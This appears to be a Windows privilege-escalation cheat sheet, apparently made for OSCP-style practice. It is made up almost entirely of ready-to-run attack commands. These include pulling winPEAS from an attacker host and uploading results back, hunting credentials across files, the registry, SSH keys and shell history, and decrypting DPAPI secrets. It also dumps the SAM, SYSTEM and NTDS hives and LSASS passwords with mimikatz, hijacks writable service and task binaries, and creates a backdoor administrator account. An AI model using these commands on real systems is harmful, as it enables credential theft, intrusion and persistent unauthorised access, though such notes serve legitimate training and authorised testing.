# Automated Enumeration
## winPEAS collection and parsing

Download, run, and upload to workstation for review:
```powershell
$exe = Join-Path $wd 'winPEASx64.exe'
$out = Join-Path $wd 'winpeas.out'
Invoke-WebRequest -UseBasicParsing -Uri "http://$LHOST/winPEASx64.exe" -OutFile $exe
& $exe log=$out
Invoke-WebRequest -UseBasicParsing -Method POST -InFile $out -Uri "http://$LHOST/upload?name=winpeas.out"
```

Fallback download:
```cmd
mkdir C:\Windows\Temp\working
certutil -urlcache -split -f http://%LHOST%/winPEASx64.exe C:\Windows\Temp\working\winPEASx64.exe
C:\Windows\Temp\working\winPEASx64.exe log=C:\Windows\Temp\working\winpeas.out
```

If SMB staging already works:
```cmd
net use Z: \\%LHOST%\share /user:user pass
mkdir C:\Windows\Temp\working
copy Z:\uploads\winPEASx64.exe C:\Windows\Temp\working\winPEASx64.exe
C:\Windows\Temp\working\winPEASx64.exe log=C:\Windows\Temp\working\winpeas.out
```

Parsers:
- [ParsingPeas](https://github.com/YuvalMil/ParsingPeas)
- [parsePEASS](https://github.com/mnemonic-re/parsePEASS)

## Run PrivescCheck
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## PowerUp.ps1 Invoke-AllChecks
```powershell
. .\PowerUp.ps1; Invoke-AllChecks
```

# Situational Awareness

## Show current user and privileges
```cmd
whoami /all
```

## List local admins
```cmd
net localgroup Administrators
```

## Show network and local-only services
```cmd
ipconfig /all
route print
netstat -ano
```

## List installed software
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select-Object DisplayName
```

## List processes
```powershell
Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
```

`--Filter "ProcessId = 1234"`

# Credential Hunting

## Search for interesting files/folders
```powershell
Get-ChildItem C:\Users -Force

Get-ChildItem -Path C:\Users -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

Get-ChildItem C:\ -Force -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include *.db,*.sqlite,*.sql -Recurse -ErrorAction SilentlyContinue

Get-ChildItem C:\ProgramData -Force

Get-ChildItem C:\Windows\Temp -Force -ErrorAction SilentlyContinue
```

## Search for passwords in general files

TODO: this is still really bad, AppData is too noisy

```powershell
# Search common credential/config file types under user profiles
Get-ChildItem C:\Users -Recurse -File -Force -ErrorAction SilentlyContinue `
  -Include *.xml,*.ini,*.config,*.txt,*.cfg,*.json,*.yml,*.yaml,*.ps1,*.bat,*.cmd |
  Select-String -Pattern 'password|passwd|pwd|credential|creds|secret|token|apikey|api_key' `
  -CaseSensitive:$false -ErrorAction SilentlyContinue |
  Select-Object FullName,LineNumber,Line
  
  
Get-ChildItem C:\Users,C:\ProgramData,C:\Windows\Temp,C:\Temp -Recurse -File -Force `
  -ErrorAction SilentlyContinue |
  Where-Object {
    $_.Name -match 'pass|pwd|cred|secret|token|config|backup|vnc'
  } |
  Select-Object FullName
  
  
Get-ChildItem C:\Users -Directory -Force -ErrorAction SilentlyContinue |
  ForEach-Object {
    Get-ChildItem "$($_.FullName)\Desktop","$($_.FullName)\Documents","$($_.FullName)\Downloads" `
      -Recurse -File -Force -ErrorAction SilentlyContinue
  } |
  Where-Object { $_.Name -match 'pass|cred|config|backup|secret|token' } |
  Select-Object FullName
```

## Search for passwords in unattended installation files
```PowerShell
@(
    "C:\sysprep.inf"
    "C:\sysprep\sysprep.xml"
    "C:\unattend.xml"
    "$env:WINDIR\Panther\Unattend\Unattended.xml"
    "$env:WINDIR\Panther\Unattended.xml"
    "$env:WINDIR\Panther\Unattend.xml"
    "$env:WINDIR\System32\Sysprep\Unattend.xml"
    "$env:WINDIR\System32\Sysprep\Sysprep.xml"
) | ForEach-Object {
    if (Test-Path $_) {
        Write-Host "`n===== $_ ====="
        Get-Content $_
    }
}
```

## Search for Windows.old
```PowerShell
if (Test-Path "C:\Windows.old") {
    Write-Host "`n===== C:\Windows.old found ====="

    Get-ChildItem C:\Windows.old -Force

    # Look for unattended installation files
    Get-ChildItem C:\Windows.old -Recurse -File -ErrorAction SilentlyContinue `
        -Include sysprep.inf,sysprep.xml,unattend.xml,unattended.xml

    # Look for registry hives
    Get-ChildItem "C:\Windows.old\Windows\System32\config" -ErrorAction SilentlyContinue
}
```

## Search for VNC credentials
```cmd
# RealVNC registry password
Get-ItemProperty 'HKLM:\SOFTWARE\RealVNC\WinVNC4' -Name Password -ErrorAction SilentlyContinue

# Find vnc.ini
Get-ChildItem C:\ -Filter 'vnc.ini' -File -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

# Find ultravnc.ini
Get-ChildItem C:\ -Filter 'ultravnc.ini' -File -Recurse -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty FullName

Get-ChildItem C:\ -File -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -like '*vnc.ini' } |
    Select-Object -ExpandProperty FullName
```

# Search for SSH keys
```
Get-ChildItem C:\Users -Directory -Force -ErrorAction SilentlyContinue |
    ForEach-Object {
        $ssh = Join-Path $_.FullName '.ssh'
        if (Test-Path $ssh) {
            Get-ChildItem $ssh -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
```

## Search for credentials in the Registry
```cmd
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query “HKCU\Software\ORL\WinVNC3\Password”
reg query “HKCU\Software\TightVNC\Server”
reg query “HKCU\Software\OpenSSH\Agent\Key”
reg query “HKCU\Software\SimonTatham\PuTTY\Sessions”
reg query “HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon”
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Check for SAM and SYSTEM file access
```
@(
    "$env:SystemRoot\repair\SAM"
    "$env:SystemRoot\System32\config\RegBack\SAM"
    "$env:SystemRoot\System32\config\SAM"
    "$env:SystemRoot\repair\SYSTEM"
    "$env:SystemRoot\System32\config\SYSTEM"
    "$env:SystemRoot\System32\config\RegBack\SYSTEM"
) | ForEach-Object {
    if (Test-Path $_) {
        Write-Host $_
    }
}
```

## Common Web Configuration Files
```
# IIS web root
if (Test-Path "C:\inetpub") {
    Get-ChildItem "C:\inetpub" -Force
}

# web.config files
Get-ChildItem C:\ -Recurse -File -Include web.config -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty FullName

# IIS global configuration
if (Test-Path "$env:SystemRoot\System32\inetsrv\config\applicationHost.config") {
    Get-Item "$env:SystemRoot\System32\inetsrv\config\applicationHost.config"
}

# Common web/database configuration files
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue `
    -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf |
    Select-Object -ExpandProperty FullName
    
    
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue `
    -Include web.config,appsettings.json,*.config,*.env,connectionStrings.config |
    Select-Object -ExpandProperty FullName
```

## IIS / Apache / FTP logs
```PowerShell
# Common web server logs
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue `
    -Include access.log,error.log |
    Select-Object -ExpandProperty FullName

# IIS log directories
Get-ChildItem "C:\inetpub\logs\LogFiles" -Recurse -ErrorAction SilentlyContinue
```

## Find PSReadLine history
```powershell
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue |
    ForEach-Object {
        Write-Host "`n===== $($_.FullName) ====="
        Get-Content $_.FullName
    }
```

## Check for saved creds
```cmd
cmdkey /list
```

## Find Credential Manager and DPAPI artifacts
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Credentials -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Local\Microsoft\Protect -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Protect -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login* -Force -ErrorAction SilentlyContinue
```

Also run:
- https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
- https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1

## Decrypt Credential Manager secrets
User-scope blobs:
```cmd
SharpDPAPI.exe credentials /unprotect
```

Machine-scope blobs with `CRYPTPROTECT_SYSTEM`:
```cmd
SharpDPAPI.exe machinecredentials
```

Only if the automated path fails and the blob is still worth forcing:
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>" "exit"
```

## Credhunt with Lazagne.exe
```cmd
LaZagne.exe all
```

# Credhunt with SessionGopher
```PowerShell
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough
```

# Service Abuse

## List services
```cmd
Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, PathName
```

## Find unquoted service paths
```cmd
Get-CimInstance Win32_Service | Select Name, StartMode, StartName, PathName | Where-Object {$_.PathName -and $_.PathName -notmatch '^"' -and $_.PathName -match '\s' }
```

## Find modifiable service files with PowerUp
```powershell
. .\PowerUp.ps1; Get-ModifiableServiceFile
```

## Validate service binary permissions
```cmd
icacls "service.exe"
```

## Abuse a writable service binary
```cmd
sc stop <service_name>
copy C:\Temp\payload.exe "C:\path\to\service.exe"
sc start <service_name>
```


# Scheduled Tasks
## List scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

## Extract task command path
```cmd
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run"
```

## Validate task binary permissions
```cmd
icacls "C:\path\to\task.exe"
accesschk.exe -wvu "C:\path\to\task.exe"
```

## Abuse a writable task binary
```cmd
copy C:\Temp\payload.exe "C:\path\to\task.exe"
schtasks /run /tn "<task name>"
```

## Check AlwaysInstallElevated
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Abuse AlwaysInstallElevated
```cmd
msiexec /quiet /qn /i evil.msi
```

# SeBackupPrivilege
## Check SeBackup / SeRestore privilege
```cmd
whoami /priv
```

## Save SAM and SYSTEM with SeBackupPrivilege
```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

## Copy protected files with robocopy backup mode
```cmd
robocopy /b C:\Windows\NTDS C:\Temp ntds.dit
robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY
```

# Post-Exploitation
## Mimikatz logonpasswords
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
```

## Mimikatz tickets
```
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"
```

## Mimikatz DPAPI
```
.\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"
```

## Dump cached credentials and SAM
```cmd
.\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
```

# Jenkins
## Quick Jenkins triage
```powershell
Get-ChildItem -Path C:\Users\*\AppData\Local\Jenkins\.jenkins -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ProgramData\Jenkins -Recurse -ErrorAction SilentlyContinue
```

## Jenkins files worth pulling
- `users\*\config.xml`
- `credentials.xml`
- `secrets\`
- `jobs\*\config.xml`
- `jobs\*\builds\`
- `workspace\`
- `nodes\`

# Post-exploitation after admin or SYSTEM

## Create local admin, grant WinRM
```
net user oscpadmin b4ckd00r3016 /add
net localgroup Administrators oscpadmin /add
net localgroup "Remote Management Users" oscpadmin /add
```

Do this before pivoting:
- read Mimikatz output
- read all `PSReadLine` history
- search for unusual files, DB files, configs, saved creds
- crack archives and inspect the contents, not just the filenames
- if a service is localhost-only, expose it now
- pull Credential Manager / `DPAPI` artifacts while you still have context
- check `ipconfig /all`, `netstat -ano`, `arp -a`
- if domain joined, rerun AD enumeration from this host
- test every found password/hash everywhere

## Resources
- Priv2Admin: https://github.com/gtworek/Priv2Admin
- LOLBAS: https://lolbas-project.github.io/
